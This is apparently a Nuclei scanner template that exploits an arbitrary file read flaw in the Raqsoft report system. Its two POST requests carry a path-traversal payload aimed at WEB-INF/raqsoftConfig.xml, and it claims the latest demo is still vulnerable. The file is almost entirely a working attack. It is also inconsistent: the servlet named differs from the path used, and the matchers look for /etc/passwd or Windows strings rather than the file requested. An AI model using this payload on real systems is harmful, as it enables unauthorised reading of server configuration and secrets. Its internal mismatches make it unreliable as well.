script_name: 润乾报表系统dataSphereServlet任意文件读取
content:
id: 润乾报表系统/servlet/dataSphereServlet任意文件读取漏洞
info:
  name: 润乾报表系统dataSphereServlet任意文件读取
  author: manjiangx
  severity: critical
  description: dataSphereServlet接口存在任意文件读取漏洞,目前最新版20240725版本的demo仍存在,官方下载地址：https://www.raqsoft.com.cn/download/download-jsbb#
  reference: #参考来演
  tags: CMS,raqsoft

requests:
    #linux下
  - method: POST
    path:
        #{{BaseURL}}!!请指定好/servlet/dataSphereServlet的根目录!!
      - "{{BaseURL}}/InputServlet?action=13"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config"
    
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root:x:0:0:"
          #失败的话，可以留上面一条，把下面的删了
          - "root:/root:/usr"
        condition: and
      - type: status
        status:
          - 200

    #windows下
  - method: POST
    path:
        #{{BaseURL}}!!请指定好/servlet/dataSphereServlet的根目录!!
      - "{{BaseURL}}/InputServlet?action=13"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config"
    
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Windows"
          - "win32"
        condition: and
      - type: status
        status:
          - 200
